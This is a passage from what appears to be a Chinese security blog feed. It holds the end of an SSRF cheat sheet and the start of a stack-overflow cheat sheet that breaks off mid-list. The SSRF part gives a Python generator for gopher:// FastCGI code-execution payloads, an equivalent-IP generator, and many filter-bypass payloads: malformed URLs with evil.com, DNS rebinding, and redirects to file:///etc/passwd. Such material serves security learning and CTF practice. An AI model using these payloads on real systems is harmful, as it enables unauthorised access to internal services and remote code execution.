= <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip (<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;% d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request (params, content)</span><br><span class="line">    response = urllib.quote (response)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:&quot;</span> + <span class="built_in">str</span>(args.port) + <span class="string">&quot;/_&quot;</span> + response)</span><br></pre></td></tr></table></figure><h2 id="其他 -Payload"><a href="# 其他 -Payload" class="headerlink" title="其他 Payload"></a>其他 Payload</h2><ul><li>在 PHP 的 SSRF 中，同样支持 PHP 伪协议。</li></ul><h1 id="绕过"><a href="# 绕过" class="headerlink" title="绕过"></a>绕过 </h1><h2 id="本机 -IP"><a href="# 本机 -IP" class="headerlink" title="本机 IP"></a> 本机 IP</h2><p>可以用 <code>0.0.0.0</code>，<code>localhost</code> 或者 <code>127.x.x.x</code> 替代 <code>127.0.0.1</code>。</p><p>IP 地址中间的 <code>0</code> 可以被省略，例如 <code>127.1</code> 等价于 <code>127.0.0.1</code>。而 <code>http://0.0.0.0/</code> 可以被省略为 <code>http://0/</code>。</p><h2 id="等价 -IP"><a href="# 等价 -IP" class="headerlink" title="等价 IP"></a>等价 IP</h2><p>特殊域名 <code>xip.io</code> 提供了 IP 解析，例如可以用 <code>192.168.0.1.xip.io</code> 或者 <code>a.b.c.192.168.0.1.xip.io</code> 等价于 <code>192.168.0.1</code>。此外，可以利用在线短地址服务，利用短地址指向被限制的 IP。</p><p>IP 地址其实就是一串数字，可以进行进制转换。例如：<code>127.0.0.1</code>，等价于十六进制 <code>0x7F000001</code>，等价于十进制 <code>2130706433</code>，等价于二进制 <code>0b1111111000000000000000000000001</code>。</p><p>也可以只转换部分 IP，例如：<code>127.0.0.1</code>，等价于 <code>0177.0.0.1</code>，等价于 <code>0x7f.0.0.1</code>。也可以混合编码，例如八进制和十六进制混合 <code>0177.0x0.0x0.0x1</code>。</p><blockquote><p>注意：进制转换后的 IP，Apache 服务器会报 400，而 Nginx，Mysql 等服务可以正常识别。</p></blockquote><p>IP 地址转换脚本，可以打印出所有的等价 IP 地址，包括十进制，八进制，十六进制，二进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">marge</span>(<span class="params">l</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        result += <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust (<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    result = <span class="built_in">int</span>(result, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> [result, <span class="built_in">hex</span>(result), <span class="built_in">oct</span>(result), <span class="built_in">bin</span>(result)]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cross</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> args [<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> iplist:</span><br><span class="line">                iplist.append (ip)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(args) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> args [<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> args [<span class="number">1</span>]:</span><br><span class="line">                ip = <span class="string">&#x27;% s.% s&#x27;</span> % (i, j)</span><br><span class="line">                <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> iplist:</span><br><span class="line">                    iplist.append (ip)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(args) == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> args [<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> args [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> args [<span class="number">2</span>]:</span><br><span class="line">                    ip = <span class="string">&#x27;% s.% s.% s&#x27;</span> % (i, j, k)</span><br><span class="line">                    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> iplist:</span><br><span class="line">                        iplist.append (ip)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(args) == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> args [<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> args [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> args [<span class="number">2</span>]:</span><br><span class="line">                    <span class="keyword">for</span> l <span class="keyword">in</span> args [<span class="number">3</span>]:</span><br><span class="line">                        ip = <span class="string">&#x27;% s.% s.% s.% s&#x27;</span> % (i, j, k, l)</span><br><span class="line">                        <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> iplist:</span><br><span class="line">                            iplist.append (ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iplist = [ip]</span><br><span class="line">raw_ip = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ip.split (<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line">cross (marge (raw_ip))</span><br><span class="line">cross (marge (raw_ip [:<span class="number">1</span>]), marge (raw_ip [<span class="number">1</span>:]))</span><br><span class="line">cross (marge (raw_ip [:<span class="number">3</span>]), marge (raw_ip [<span class="number">3</span>:]))</span><br><span class="line">cross (marge (raw_ip [:<span class="number">2</span>]), marge (raw_ip [<span class="number">2</span>:<span class="number">3</span>]), marge (raw_ip [<span class="number">3</span>:]))</span><br><span class="line">cross (marge (raw_ip [:<span class="number">1</span>]), marge (raw_ip [<span class="number">1</span>:<span class="number">3</span>]), marge (raw_ip [<span class="number">3</span>:]))</span><br><span class="line">cross (marge (raw_ip [:<span class="number">1</span>]), marge (raw_ip [<span class="number">1</span>:<span class="number">2</span>]), marge (raw_ip [<span class="number">2</span>:]))</span><br><span class="line">cross (marge (raw_ip [:<span class="number">1</span>]), marge (raw_ip [<span class="number">1</span>:<span class="number">2</span>]),</span><br><span class="line">      marge (raw_ip [<span class="number">2</span>:<span class="number">3</span>]), marge (raw_ip [<span class="number">3</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> iplist:</span><br><span class="line">    <span class="built_in">print</span>(ip)</span><br></pre></td></tr></table></figure><h2 id="前缀限制"><a href="# 前缀限制" class="headerlink" title="前缀限制"></a>前缀限制 </h2><p> 必须以指定域名开头 <code>^http://www.baidu.com.*</code></p><p>利用 url 中可选的用户名和密码部分，域名或 ip 地址前的 <code>@</code> 表示访问到该 url 需要输入的用户名和密码，其中 <code>:</code> 前为用户名，后为密码，例如 <code>http://username:password@example.com/</code>。则 <code>http://www.baidu.com@127.0.0.1</code> 或者 <code>http://www.baidu.com:xxxx@127.0.0.1</code> 等价于 <code>http://127.0.0.1</code>。</p><p>可以利用 <code>xip.io</code> 绕过前缀限制，例如 <code>http://www.baidu.com.127.0.0.1.xip.io/</code></p><h2 id="后缀限制"><a href="# 后缀限制" class="headerlink" title="后缀限制"></a>后缀限制 </h2><p> 必须以指定域名结尾 <code>.*baidu.com$</code></p><p>可以尝试利用如下 payload 绕过。</p><ul><li><code>http://127.0.0.1/index.php#www.baidu.com</code></li><li><code>http://127.0.0.1/index.php?baidu.com</code></li></ul><h2 id="畸形 -url"><a href="# 畸形 -url" class="headerlink" title="畸形 url"></a>畸形 url</h2><p>例如 url<code>http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/</code>（注意其中包含了 2 个空格），在 Python 中，urllib2 和 httplib 会解析出 <code>1.1.1.1</code>，requests 会解析出 <code>2.2.2.2</code>，urllib 会解析处 <code>3.3.3.3</code>。</p><p>例如 url<code>http://127.0.0.1:12345:80/</code>，PHP 的 <code>parse_url</code> 和 Perl 的 <code>URI</code> 会解析出 80 端口，而 PHP 的 <code>readfile</code> 和 Perl 的 <code>LWP</code> 会解析出 12345 端口。</p><p>例如 url<code>http://127.0.0.1#@evil.com/</code>，PHP 的 <code>readfile</code> 会解析出 <code>evil.com</code>，PHP 的 <code>parse_url</code> 会解析出 <code>127.0.0.1</code>。</p><p>例如 url<code>http://foo@127.0.0.1:80@evil.com/</code>，curl/libcurl 会解析出 <code>127.0.0.1:80</code>，NodeJS 的 <code>URL</code>，Perl 的 <code>URI</code>，Go 的 <code>net/url</code>，PHP 的 <code>parse_url</code>，Ruby 的 <code>addressable</code> 会解析出 <code>evil.com</code>。</p><blockquote><p>注意：上条 payload 中 curl 7.54.0 之前已经修复，但是可以通过 <code>http://foo@127.0.0.1 @evil.com/</code> 绕过。注意 <code>@</code> 之前有一个空格。</p></blockquote><p>curl 或者 wget 可尝试下列 payload，都会解析出 <code>http://127.0.0.1/</code>。</p><ul><li><code>http://127.0.0.1;baidu.com/</code></li><li><code>0://127.0.0.1;baidu.com/</code></li><li><code>0://127.0.0.1:80;baidu.com:80/</code></li><li><code>0://127.0.0.1:80=baidu.com:80</code></li><li><code>0://abc@127.0.0.1:80@baidu.com</code></li></ul><blockquote><p>注意：也可以使用逗号 <code>,</code> 代替分号 <code>;</code>。</p></blockquote><p>利用空 bash 变量 <code>$</code> 绕过，需要将 url 带入 bash 中，例如 <code>http://127.0.0$foo.1</code> 中，<code>$foo</code> 变量不存在，默认为空字符串，等价于 <code>http://127.0.0.1</code>。</p><h2 id="特殊符号"><a href="# 特殊符号" class="headerlink" title="特殊符号"></a>特殊符号 </h2><p> 过滤了 <code>.</code> 符号，某些情况可以用中文句号 <code>。</code> 代替（例如 Chrome）。</p><p>在某些情况下（例如 curl）支持国际化特殊符号（IDNA），它们与对应的数字 / 字母等价。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ </span><br><span class="line">⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽</span><br><span class="line">⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑</span><br><span class="line">⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨</span><br><span class="line">⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ</span><br><span class="line">Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ</span><br><span class="line">ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾</span><br><span class="line">⓿ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br></pre></td></tr></table></figure><p>例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 等价于 <code>example.com</code>。</p><p>除了上述 IDNA 字符以外，利用一些 unicode 字符解析不兼容性也可以绕过，例如 <code>ß</code> 在某些情况下等价于 <code>ss</code>，此外，一些 unciode 字符也会被忽略，例如 <code>g\u200Doogle.com</code> 等价于 <code>google.com</code>，其中 <code>\u200D</code> 被忽略。</p><h2 id="DNS- 重绑定"><a href="#DNS- 重绑定" class="headerlink" title="DNS 重绑定"></a>DNS 重绑定 </h2><p> 服务器向 DNS 服务器请求解析两次域名，在 DNS 服务器可控的情况下利用两次解析之间的时间差绕过 IP 地址限制。</p><ol><li>客户端（攻击者）向服务器发送正常域名 <code>http://example.com</code>。</li><li>服务器拿到域名后做 DNS 解析，例如验证该域名是否为内网 IP，DNS 服务器第一次返回了一个非内网 IP 地址 A。</li><li>该域名在服务器端通过验证，域名被继续传递给可以 SSRF 的函数，例如 <code>url_open</code>，这时又会发生第二次 DNS 解析。</li><li>在第二次 DNS 解析发生之前，在 DNS 服务器中修改该域名的 IP 为内网 IP，并且设置 TTL 为 0。</li><li>服务端再次向 DNS 服务器发送解析请求，而这时 DNS 服务器中该域名的 IP 已经被修改为内网 IP，并且该域名的 TTL 被修改为 0，即 DNS 服务器会直接新修改的 IP 而不是之前的缓存。</li><li>服务器收到内网 IP 地址 B，成功绕过。</li></ol><h2 id="重定向"><a href="# 重定向" class="headerlink" title="重定向"></a>重定向 </h2><p> 若可以访问外网但无法直接访问内网，在支持跳转的情况下，可以利用外网作为 302 跳板绕过协议限制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location: http://127.0.0.1&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location: file:///etc/passwd&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h2><p>在服务器支持 IPv6 的情况下可用。</p><p><code>::1</code> 等价于 IPv4 的 <code>127.0.0.1</code>。<code>ip6-localhost</code> 等价于 IPv4 的 <code>localhost</code>。</p><p>IPv6 也提供了特殊域名解析 <code>ip6.name</code>，例如 <code>x.1.ip6.name</code> 等价于 IPv4<code>127.0.0.1.xip.io</code>。</p><p>IPv6 也可以省略 IP 地址中间的 0，例如 <code>http://[::]/</code> 等价于 <code>http://0.0.0.0/</code>，或者 <code>http://[0000::1]/</code> 等价于 <code>http://127.0.0.1/</code>。</p><p>以下 IPv6 地址均可访问本机：</p><ul><li>::127.0.0.1</li><li>::ffff:127.0.0.1</li><li>::1%1</li></ul><h2 id="Glibc- 解析"><a href="#Glibc- 解析" class="headerlink" title="Glibc 解析"></a>Glibc 解析 </h2><p> 在 glibc 函数 <code>gethostbyname</code> 中，存在部分解析问题。</p><ul><li>支持字符转义，例如 <code>b\\097idu.com</code> 等价于 <code>baidu.com</code>，其中 <code>\097</code> 为十进制的 <code>a</code>。</li><li>多余的反斜杠会被忽略，例如 <code>\\b\\a\\i\\d\\u.\\c\\o\\m</code> 等价于 <code>baidu.com</code>。</li><li>第一个空白字符后的数据会被忽略，例如 <code>127.0.0.1 abc</code> 等价于 <code>127.0.0.1</code>。</li></ul><p>因此若底层使用该函数进行解析，则可以采用上述方法绕过。</p><h2 id="内网 -IP"><a href="# 内网 -IP" class="headerlink" title="内网 IP"></a>内网 IP</h2><p>以下 IP 范围均输入内网 IP：</p><ul><li>10.0.0.0/8</li><li>172.16.0.0/12</li><li>192.168.0.0/16</li></ul>]]></content>
    
    
    <summary type="html">SSRF payloads and attack methods.</summary>
    
    
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/categories/CheatSheet/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="SSRF" scheme="https://srpopty.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>Stack Overflow CheatSheet</title>
    <link href="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/"/>
    <id>https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/</id>
    <published>2021-08-14T08:58:55.000Z</published>
    <updated>2021-08-14T08:58:55.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> 本文中的内容均以 x86 架构为基础 </p></blockquote><h1 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h1><p>32 位程序寄存器最大 32 位（4 字节）如 eax，64 位程序寄存器最大 64 位（8 字节）如 rax。寄存器大小示意图如下。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/2.png"></p><h1 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h1><p> 栈是一种后入先出（LIFO）的数据结构，在内存空间中由高地址向低地址生长，如下所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/1.png"></p><h1 id="Call-a-Func"><a href="#Call-a-Func" class="headerlink" title="Call a Func"></a>Call a Func</h1><p> 程序执行过程中所调用的每一个函数都有属于其自己的栈帧（Stack Frame），栈帧中保存该函数内部使用的各种局部变量。每个函数的栈帧由栈底寄存器 ebp 和栈顶寄存器 esp 确定，其中 esp 可能随着函数内部的执行而变化，ebp 一直不变，所以大部分局部变量与函数参数的位置均根据 ebp 来确定。</p><p> 在调用一个新函数时需要做三件事：</p><ol><li> 传递参数，32 位与 64 位参数传递方式不同：32 位程序将参数从右向左压入栈中传递，64 位程序前 6 个参数通过寄存器 rdi，rsi，rdx，rcx，r8，r9 传递，从第 7 个参数开始从右向左压入栈中传递 </li><li> 保存返回地址，即调用完新函数以后要执行的下一条指令地址，该操作由 call 指令完成，即 <code>call = (push eip &amp;&amp; eip = ret_addr)</code></li><li> 进入被调用者的流程，被调用者保存调用者的栈帧，在栈上 push 当前 ebp，之后使 esp=ebp，即 <code>push ebp &amp;&amp; esp = ebp</code>，最后开辟新栈帧 </li></ol><p> 当一个函数执行完成后需要做三件事：</p><ol><li> 传递返回值到 eax 中，若返回值大于 4 字节小于 8 字节，则高 4 字节放入 eax，低 4 字节放入 edx</li><li> 恢复调用者的栈帧，恢复原来的 esp，使 esp=epb，并且 pop 栈上的 old ebp 到当前 ebp 中，该操作由 leave 指令完成，即 <code>(esp = ebp &amp;&amp; pop ebp)</code></li><li> 跳转到执行完函数的下一条地址，恢复到调用者的执行流程，该操作由 ret 指令完成，即 <code>ret = pop eip</code></li></ol><p> 常见 32 位调用约定如下，64 位只有一种调用约定，前 6 个参数通过寄存器 rdi，rsi，rdx，rcx，r8，r9 传递，从第 7 个参数开始从右向左入栈 </p><ul><li>cdecl：C 函数 / C++ 非成员函数默认的调用约定，参数从右向左入栈，调用者清理栈中参数，eax 存放返回值，支持可变参数（例如 printf）</li><li>stdcall：Pascal 或 WinAPI 常用，参数从右向左入栈，被调用者清理栈中参数，eax 存放返回值 </li><li>fastcall：前两个小于 4 字节的参数使用 ecx 和 edx 传递，其余参数从右向左入栈，被调用者清理栈中参数，eax 存放返回值 </li><li>thiscall：C++ 非静态的成员函数使用，C++ 成员函数需要使用 this 指针，若参数数量固定，则 this 指针通过 ecx 传递，其余参数从右向左入栈，被调用者清理栈中参数；若参数数量不固定，所有参数从右向左入栈，最后 this 指针入栈，调用者清理栈中参数 </li></ul><p> 发生函数调用 <code>func (1, 2, 3)</code> 时，栈变化如下所示（cdecl，32 位，64 位除了参数传递使用寄存器以外其余均相同），其中 ret 表示 call func 指令结束之后下一条指令的地址，即返回地址，old ebp 表示调用者栈帧的 ebp。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/3.png"></p><p> 函数 func 执行完毕后，栈变化如下所示（cdecl，32 位），为了便于表示，将 leave 指令拆分为两条指令。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/4.png"></p><h1 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h1><p> 局部变量保存在栈中，当程序接受用户输入并且保存到局部变量中时，若接收到的数据长度大于栈中给局部变量预留的数据长度，则可以发生溢出，修改局部变量之后的数据，包括 old ebp 以及 ret，如果可以修改 ret，就可以劫持控制流，当函数执行结束以后就可以跳转到任意指定地址。栈溢出过程如下图所示，假设 func 函数中有一块 16 字节大小的局部变量 buf，但是接收到了超过 16 字节大小的数据并且被写入到 buf 中，假设输入的数据为 <code>&#39;A&#39;*(16+4) + &#39;B&#39;*4</code>，可以看到返回地址 ret 已经被修改为 BBBB，将 payload 中的 BBBB 修改为其他有可执行权限的地址即可。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/5.png"></p><p> 可能会造成栈溢出的函数 </p><ul><li><p>read</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从文件 fd 中读取 nbyte 个字节写入到 buf 中 </span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span> <span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbyte)</span>;</span><br><span class="line"><span class="comment">//fd: 文件描述符，0 为从标准输入读取 </span></span><br><span class="line"><span class="comment">//buf: 要写入位置的指针 </span></span><br><span class="line"><span class="comment">//nbyte: 要读取的字节数 </span></span><br><span class="line"><span class="comment">// 返回实际读取到字节数，若返负数表示出现了错误 </span></span><br></pre></td></tr></table></figure></li><li><p>write</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 buf 中读取 nbytes 个字节写入到文件 fd 中 </span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span> *buf,<span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="comment">//fd: 文件描述符，1 表示输出到标准输出 </span></span><br><span class="line"><span class="comment">//buf: 要读取位置的指针 </span></span><br><span class="line"><span class="comment">//nbyte: 要写入的字节数 </span></span><br><span class="line"><span class="comment">// 返回实际写入到字节数，若返回负数表示出现了错误 </span></span><br></pre></td></tr></table></figure></li><li><p>gets</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从标准输入缓冲区中读取字符串到 str 所指的位置中 </span></span><br><span class="line"><span class="comment">//gets 会从输入缓冲区读取到换行符为止，作为一个字符串，并且删去最后的换行符写入 str 中 </span></span><br><span class="line"><span class="comment">//gets 可以读取空格 </span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br><span class="line"><span class="comment">//str: 要写入位置的指针 </span></span><br><span class="line"><span class="comment">// 若读取成功返回写入位置的指针，否则返回空指针 </span></span><br></pre></td></tr></table></figure></li><li><p>scanf</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从标准输入缓冲区中读取符合格式的字符串，遇到空格停止读取 </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">scanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="comment">//format: 格式化字符串 </span></span><br><span class="line"><span class="comment">//...: 需要被格式化到 format 的参数 </span></span><br><span class="line"><span class="comment">// 若读取成功，返回匹配和赋值的个数，否则返回 EOF</span></span><br></pre></td></tr></table></figure></li><li><p>strcpy/strncopy/memcpy</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从原指针指向的位置读取指定数量字节写入到目标指针的位置 </span></span><br><span class="line"><span class="comment">//strcpy/strncpy 只支持字符串的复制，memcpy 可以复制任何内容 </span></span><br><span class="line"><span class="comment">//strcpy 函数读取到 \0 为止，会将 \0 复制到目标位置，而 strncpy 不会添加 \0，若 src 的长度小于 n 字节则用 \0 填充 </span></span><br><span class="line"><span class="type">char</span>* <span class="title function_">strcpy</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> count )</span>;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src,<span class="type">int</span> <span class="type">size_t</span> n)</span>;</span><br><span class="line"><span class="comment">//dest: 要写入的位置的指针 </span></span><br><span class="line"><span class="comment">//src: 原位置的指针 </span></span><br><span class="line"><span class="comment">//count/n: 要写入的字节数 </span></span><br><span class="line"><span class="comment">// 